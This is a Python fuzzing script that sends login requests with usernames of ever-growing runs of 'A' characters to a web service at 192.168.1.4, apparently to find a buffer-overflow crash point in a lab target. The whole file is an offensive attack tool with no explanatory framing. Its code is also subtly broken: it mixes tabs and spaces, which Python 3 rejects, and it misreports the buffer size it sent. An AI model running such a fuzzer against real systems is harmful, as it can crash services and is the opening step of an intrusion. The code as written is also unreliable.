import requests, json
from time import sleep
import sys

headers = {
"Host": "192.168.1.4",
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"Content-Type": "application/x-www-form-urlencoded",
"Content-Length": "27",
"Origin": "http://192.168.1.4",
"Connection": "close",
"Referer": "http://192.168.1.4/login",
"Upgrade-Insecure-Requests": "1"
}
buffer = 100


while True:
    try:
	url = "http://192.168.1.4/login"
	data = {
	     "username":buffer*"A",
	     "password":"AAAA"
	    }
	ans = requests.post(url, data=data, headers=headers)
	buffer += 100
	print("Sending {} bytes".format(buffer))
	sleep(5)
    except:
        print("Could not coonect to the server")
	sys.exit()
